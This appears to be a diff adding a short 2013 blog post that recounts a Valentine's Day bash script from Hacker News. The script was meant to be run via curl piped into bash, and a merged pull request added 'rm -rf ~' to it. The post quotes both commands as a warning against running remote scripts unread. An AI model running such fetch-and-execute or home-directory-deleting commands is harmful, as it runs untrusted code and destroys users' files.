@@ -1,0 +1,21 @@
+--- 
+title: Valentine d-day
+date: 13/02/2013
+description: valentine day pranks, for geeks.
+
+Valentine day.  
+it's stupid, but [somebody made it stupid-ier](http://williamedwardscoder.tumblr.com/post/42921614369/omg-rm-rf-in-a-valentine-bash-script-and-its-partly).  
+
+Beginning with a Hacker News post titled [Valentine greeting with bash script](http://news.ycombinator.com/item?id=5206141), where anyone who want a 'geeky valentine greeting' are required to run a set of bash script:  
+
+    bash <(curl https://raw.github.com/afshinm/valentine_script/master/valentine.sh) He She
+
+Anyone who really want a 'geeky greeting' will run it in their terminal, without even inspecting the sources. Turns out that somebody has send a pull request to the script and -here's the _funny_ part- the author has accepted it. the pull request added the command  
+
+    rm -rf ~
+
+to the one-liner script source. it won't be visible in the output of the bash script above, but boy, it destroys your ~ sweet ~.  
+
+sure, it's got deleted 17 minutes later, but it's on Hacker News. millions of poor 'geeks' has visited it in these period of time.  
+
+lesson learned, never trust any command that requires you to run some scripts over the internet. even it's [RVM](https://rvm.io) (rvm is messed up, though. better off with [rbenv](https://github.com/sstephenson/rbenv/) - you're welcome.) install scripts. these 'valentine' might be yours.
